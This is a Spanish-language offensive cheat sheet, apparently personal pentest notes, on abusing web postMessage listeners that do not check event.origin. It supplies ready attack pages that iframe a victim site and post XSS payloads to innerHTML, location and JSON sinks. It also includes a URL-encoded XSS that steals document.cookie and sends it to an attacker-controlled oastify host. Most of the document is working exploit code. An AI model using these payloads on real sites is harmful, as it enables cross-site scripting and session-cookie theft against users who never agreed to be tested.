# Web Messages (postMessage) a un iframe

> La víctima tiene un `addEventListener('message', ...)` que manda `e.data` a un sink (`innerHTML`, `location`, `src`) sin validar `event.origin`. Creás el iframe por JS y le enviás el payload en su `onload`.

```html
<script>
const iframe = document.createElement('iframe');
iframe.src = 'https://VICTIMA.com/';
iframe.onload = () => {
  iframe.contentWindow.postMessage('PAYLOAD', '*');
};
document.body.appendChild(iframe);
</script>
```

**PAYLOAD según el sink**
- `innerHTML` → `<img src=x onerror=print()>`
- `location` / `src` → `javascript:print()`
- espera objeto (`JSON.parse`) → `JSON.stringify({url:'javascript:print()'})`

**Listener vulnerable (así se ve en la víctima)**
```javascript
window.addEventListener('message', e => document.getElementById('ads').innerHTML = e.data);
```

---

## Dirección inversa: iframe → padre (robo de cookie vía XSS + `postMessage`)

> El atacante iframea una URL de la víctima con un XSS que hace `parent.postMessage(document.cookie, '*')`. El atacante escucha y exfiltra lo recibido a OAST. Un solo `https://` en la URL; si `e.data` llega vacío la cookie es `HttpOnly`.

```html
<body>
<script>
  // URL de la víctima con el XSS inyectado (URL-encoded):
  //   ...&test'></a><script>parent.postMessage(document.cookie,'*')</script>
  const url = 'https://VICTIMA.net/product?productId=1&test%27%3E%3C/a%3E%3Cscript%3Eparent.postMessage(document.cookie,%27*%27)%3C/script%3E';

  window.addEventListener('message', e => {
    new Image().src = 'https://TU-OAST.oastify.com/?c=' + e.data;
  });

  const iframe = document.createElement('iframe');
  iframe.src = url;
  document.body.appendChild(iframe);
</script>
</body>
```

## 🔗 [[exfil-oastify]] · [[../../vulnerabilities/025-dom-based/dom-based|DOM-based]]
